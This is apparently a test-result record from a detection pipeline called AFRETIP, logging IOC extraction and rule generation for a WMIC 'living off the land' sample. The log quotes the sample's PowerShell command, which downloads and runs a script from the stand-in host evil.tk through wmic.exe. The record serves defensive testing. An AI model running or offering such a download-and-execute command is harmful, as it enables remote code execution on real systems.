{
  "test_file": "lol_03_wmic_execution.json",
  "test_category": "malicious",
  "timestamp": "2025-08-18T19:58:58.861894",
  "processing_time": 165.52070474624634,
  "success": true,
  "metrics": {
    "iocs_extracted": 14,
    "findings_generated": 15,
    "rules_generated": 11,
    "ioc_extraction_time": 165.15,
    "threat_classifications": {
      "suspicious": 8,
      "malicious": 6
    },
    "confidence_scores": [
      0.8500000000000001,
      1.0,
      1.0,
      1.0,
      1.0,
      1.0,
      1.0,
      1.0,
      1.0,
      1.0,
      1.0,
      1.0,
      1.0,
      1.0
    ],
    "threat_levels": {
      "medium": 8,
      "high": 6
    },
    "rule_generation_efficiency": 0.7333333333333333
  },
  "memory_delta_mb": 0.0,
  "peak_memory_mb": 26.73,
  "raw_output": "\ud83e\uddea Performing AFRETIP Dry Run\n\ud83d\udcc1 Using configuration: config/config-dev.yaml\n2025-08-18 19:56:13 [info     ] Configuration loaded successfully path=config/config-dev.yaml sections=['wazuh', 'processing', 'extraction', 'storage', 'analytics', 'deployment', 'logging', 'reputation_services', 'threat_intelligence', 'hybrid_classification', 'whitelist', 'rule_generation', 'monitoring', 'performance', 'development']\n\u2705 Configuration structure validated\n\ud83d\udcc4 Processing sample log: experiments/malicious/living_off_land/lol_03_wmic_execution.json\n\ud83d\udd27 Initializing processing engine...\n2025-08-18 19:56:13 [info     ] Enhanced IOC Extractor initialized confidence_threshold=0.3 context_filtering=True\n2025-08-18 19:56:13 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:56:13 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:56:13 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:56:13 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 19:56:13 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 19:56:13 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 19:56:13 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:56:13 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:56:13 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:56:13 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:56:13 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:56:13 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:56:13 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 19:56:13 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 19:56:13 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 19:56:13 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:56:13 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:56:13 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:56:13 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 19:56:13 [info     ] Threat detector initialized    confidence_threshold=0.6 novelty_detection=True novelty_threshold=0.7 pattern_detection=True\n2025-08-18 19:56:13 [info     ] Parsing existing rules from: /var/ossec/etc/rules\n2025-08-18 19:56:13 [warning  ] Rules directory not found: /var/ossec/etc/rules\n2025-08-18 19:56:13 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 19:56:13 [info     ] Parsing existing rules from: data/rules\n2025-08-18 19:56:13 [info     ] Parsed 0 existing rules, IOC coverage for 0 IOCs\n2025-08-18 19:56:13 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 19:56:13 [info     ] Analytics metrics initialized  output_dir=data/analytics session_id=20250818_195613\n2025-08-18 19:56:13 [info     ] Analytics metrics enabled for data collection\n2025-08-18 19:56:13 [info     ] Processing engine initialized\n\u2699\ufe0f Processing sample log...\n2025-08-18 19:56:13 [debug    ] Enhanced IOC extraction completed context=unknown extraction_time=0.001s iocs_found=14 log_hash=ebf141ad8bf4428780461a1bf2b98694\n2025-08-18 19:56:16 [info     ] Threat detected                classification=suspicious confidence=0.8500000000000001 ioc_type=ip ioc_value=192.168.1.100 threat_level=medium\n2025-08-18 19:56:16 [debug    ] VirusTotal rate limiting       sleep_time=12.220170736312866\n2025-08-18 19:56:29 [info     ] Threat detected                classification=suspicious confidence=1.0 ioc_type=domain ioc_value=powershell.exe threat_level=medium\n2025-08-18 19:56:29 [debug    ] VirusTotal rate limiting       sleep_time=13.98347020149231\n2025-08-18 19:56:44 [info     ] Threat detected                classification=suspicious confidence=1.0 ioc_type=domain ioc_value=Net.WebClient threat_level=medium\n2025-08-18 19:56:44 [debug    ] VirusTotal rate limiting       sleep_time=14.079725980758667\n2025-08-18 19:56:59 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=domain ioc_value=evil.tk threat_level=high\n2025-08-18 19:56:59 [debug    ] VirusTotal rate limiting       sleep_time=14.008707284927368\n2025-08-18 19:57:14 [info     ] Threat detected                classification=suspicious confidence=1.0 ioc_type=domain ioc_value=wmic.exe threat_level=medium\n2025-08-18 19:57:14 [debug    ] VirusTotal rate limiting       sleep_time=14.070473670959473\n2025-08-18 19:57:29 [info     ] Threat detected                classification=suspicious confidence=1.0 ioc_type=domain ioc_value=cmd.exe threat_level=medium\n2025-08-18 19:57:29 [debug    ] VirusTotal rate limiting       sleep_time=14.125264883041382\n2025-08-18 19:57:44 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=url ioc_value=\"http://evil.tk/script.ps1')\" threat_level=high\n2025-08-18 19:57:44 [debug    ] VirusTotal rate limiting       sleep_time=13.984659433364868\n2025-08-18 19:57:58 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 19:57:58 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=file_path ioc_value=//evil.tk/script.ps1 threat_level=high\n2025-08-18 19:57:58 [debug    ] VirusTotal rate limiting       sleep_time=14.998149156570435\n2025-08-18 19:58:13 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 19:58:13 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=file_path ioc_value=C:\\\\Windows\\\\System32\\\\wbem\\\\wmic.exe threat_level=high\n2025-08-18 19:58:13 [debug    ] VirusTotal rate limiting       sleep_time=14.999315023422241\n2025-08-18 19:58:28 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 19:58:28 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=file_path ioc_value=C:\\\\Windows\\\\System32\\\\cmd.exe threat_level=high\n2025-08-18 19:58:28 [debug    ] VirusTotal rate limiting       sleep_time=14.998180389404297\n2025-08-18 19:58:43 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.PROCESS_NAME: 'process_name'>\n2025-08-18 19:58:43 [info     ] Threat detected                classification=suspicious confidence=1.0 ioc_type=process_name ioc_value=powershell.exe threat_level=medium\n2025-08-18 19:58:43 [debug    ] VirusTotal rate limiting       sleep_time=14.999499797821045\n2025-08-18 19:58:58 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.PROCESS_NAME: 'process_name'>\n2025-08-18 19:58:58 [info     ] Threat detected                classification=suspicious confidence=1.0 ioc_type=process_name ioc_value=wmic.exe threat_level=medium\n2025-08-18 19:58:58 [info     ] Threat detected                classification=suspicious confidence=1.0 ioc_type=process_name ioc_value=cmd.exe threat_level=medium\n2025-08-18 19:58:58 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=command_line ioc_value='IEX (New-Object Net.WebClient).DownloadString(\\'http://evil.tk/script.ps1\\')\\\\\"\",\\n      \"image\": \"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\wbem\\\\\\\\wmic.exe\",\\n      \"parentImage\": \"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\cmd.exe\"\\n    }\\n  },\\n  \"location\": \"EventChannel\",\\n  \"full_log\": \"Test log entry for lol_03_wmic_execution scenario\"\\n}' threat_level=high\n2025-08-18 19:58:58 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=b54a11ceffef4972a5e90b6b9d919d81 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:58:58 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=496739151a484480b82982955b253a0e new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:58:58 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=122bb5552b0d4b02883c4a4cf3488ed0 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:58:58 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=47455773addb49be958a55c174f0a464 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:58:58 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=56fe66f68c8445de92d9040672e72913 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:58:58 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=6036edae540c42eabea7abeca7138c7e new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:58:58 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=8248e264e7504dcb9f84aaa4ea824d09 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:58:58 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=57f5147d79954b1a90eaa80dacf3d3d4 new_rules_generated=0 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:58:58 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=7a6a6c3734ba4c93bf9d609f1b0fa220 new_rules_generated=0 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:58:58 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=11c65d3b07a8452d83e98fed3450a4ab new_rules_generated=0 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:58:58 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=a6bbbf09b00a4cc1bf737de79f09c6c7 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:58:58 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=2cb1b50b14b842268f4d91fd89cc9fa0 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:58:58 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=211fefd4208a495a817e1f99015139f3 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:58:58 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=e9b8f5bfebaf4afa9a44d4842e285a7f new_rules_generated=0 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:58:58 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=dde5b00b769c4900aafad9975d82515e new_rules_generated=1 total_iocs=14 uncovered_iocs=14\n\n\ud83d\udcca Sample Log Processing Results:\n  \u2022 IOCs extracted: 14\n  \u2022 Findings generated: 15\n  \u2022 Rules generated: 11\n  \u2022 Processing time: 165.150s\n\n\ud83d\udd0d Extracted IOCs (showing first 5):\n  \u2022 IOCType.IP: 192.168.1.100 (confidence: 0.50)\n  \u2022 IOCType.DOMAIN: powershell.exe (confidence: 0.70)\n  \u2022 IOCType.DOMAIN: Net.WebClient (confidence: 0.70)\n  \u2022 IOCType.DOMAIN: evil.tk (confidence: 1.00)\n  \u2022 IOCType.DOMAIN: wmic.exe (confidence: 0.70)\n\n\ud83c\udf89 Dry run successful!\n\u2705 The pipeline should work correctly with this configuration\n",
  "errors": ""
}